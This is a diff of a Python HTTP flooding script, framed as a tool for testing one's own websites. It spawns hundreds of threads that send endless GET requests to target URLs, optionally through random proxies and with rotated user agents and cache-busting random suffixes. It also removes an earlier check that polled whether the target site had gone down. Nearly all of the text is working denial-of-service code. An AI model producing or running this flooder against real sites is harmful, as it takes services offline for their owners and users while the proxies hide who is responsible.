@@ -2,22 +2,22 @@
 # Script created for testing your own websites
 # by Alexey Privalov | www.alex0007.ru
 import threading
-import urllib.request
-import time
+import http.client
+import urllib.parse
 import random
 import sys
 import string
 
-# Global parameters
-thread_limit = 1000
+# TODO вынести это в config.txt
 referrer = ""
-request_methods = ["GET", "HEAD"]
-timeout_max = 30
-timeout_min = 0
+request_methods = ["GET"]
+thread_limit = 600
+append_rand_string_to_url = False
+
+# Global variables
 user_agents = []  # in file 'useragents.txt'
 proxies = []  # in file 'proxies.txt' if none - attack directly
 url = []  # from file 'urls.txt' or enter manually
-append_rand_string_to_url = False
 # Global parameters end
 
 
@@ -27,54 +27,26 @@ class Flooder(threading.Thread):
 
     def run(self):
         try:
+            cur_url = urllib.parse.urlparse(random.choice(url))
             while True:
-                randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
-                q1 = str(round(random.uniform(0.5, 0.7), 1))
-                q2 = str(round(random.uniform(0.7, 1), 1))
                 cur_header = {
-                    "Content-type": "application/x-www-form-urlencoded",
-                    "Accept": "text/plain; q=" + q1 + ", text/html, "
-                                                      "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
-                    "Keep-Alive": "300",
-                    "Connection": "Keep-Alive",
-                    "Cache-Control": "no-cache",
-                    "Pragma": "no-cache",
                     "User-agent": random.choice(user_agents),
-                    "Referrer": referrer,
-                    "Accept-Encoding": "gzip,deflate"
+                    "Referrer": referrer
                 }
-                request = urllib.request.Request(random.choice(url), headers=cur_header) if not append_rand_string_to_url else urllib.request.Request(url + randstr, headers=cur_header)
-                if len(proxies) > 0:
-                    proxy = {"http": "http://%s" % random.choice(proxies)}
-                    proxy_support = urllib.request.ProxyHandler(proxy)
-                    opener = urllib.request.build_opener(proxy_support, urllib.request.HTTPHandler())
-                    urllib.request.install_opener(opener)
-                request.method = random.choice(request_methods)
-                response = urllib.request.urlopen(request, timeout=random.randint(timeout_min, timeout_max))
+                if len(proxies) == 0:  # setting direct connection here
+                    connection = http.client.HTTPConnection(cur_url.netloc)
+                    url_str = cur_url.path + cur_url.params + cur_url.query
+                else:  # connect via random proxy
+                    connection = http.client.HTTPConnection(random.choice(proxies))
+                    url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
+                if not append_rand_string_to_url:
+                    connection.request(method=random.choice(request_methods), url=url_str, headers=cur_header)
+                else:
+                    randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
+                    connection.request(method=random.choice(request_methods), url=url_str + randstr, headers=cur_header)
         except:
             sys.exit()
             pass
-
-
-class Checker(threading.Thread):
-    current_sec = None
-
-    def __init__(self):
-        threading.Thread.__init__(self)
-
-    def run(self):
-        while True:
-            if time.localtime().tm_sec % 15 == 0 and self.current_sec != time.localtime().tm_sec:
-                self.current_sec = time.localtime().tm_sec
-                try:
-                    req = urllib.request.Request("http://isup.me/" + target.netloc + target.path)
-                    if urllib.request.urlopen(req).read().decode().find("It's just you") > 0:
-                        status = "up"
-                    else:
-                        status = "down"
-                    print("The website is", status)
-                except:
-                    print("Can't check website status")
 
 
 class SettingsReader():
@@ -82,6 +54,7 @@ class SettingsReader():
         self.read_useragents()
         self.read_urls()
         self.read_proxies()
+        self.read_config()
 
     @staticmethod
     def read_file_to_array(file_desc):
@@ -117,27 +90,20 @@ class SettingsReader():
         proxies = self.read_file_to_array(file)
         file.close()
 
-
+    def read_config(self):
+        # TODO
+        pass
 
 
 SettingsReader()
 
 target = urllib.parse.urlparse(random.choice(url))
-if target.netloc.__len__() == 0:
-    print("Incorrect url input")
-    sys.exit()
-if str(target.path).__len__() == 0:
-    str_target = target.scheme + "://" + target.netloc + target.path + "/"
-    target = urllib.parse.urlparse(str_target)
-str_target = target.scheme + "://" + target.netloc + target.path
-# preparations ended
-
-print("Flooding %s" % target.netloc)
 print(str(len(user_agents))+' user agents detected')
 print(str(len(url))+' urls detected')
 print(str(len(proxies))+' proxies detected')
+print(str(thread_limit) + ' threads')
+print("Flooding %s" % target.netloc)
 
-Checker().start()
 while True:
     if threading.active_count() <= thread_limit:
         Flooder().start()
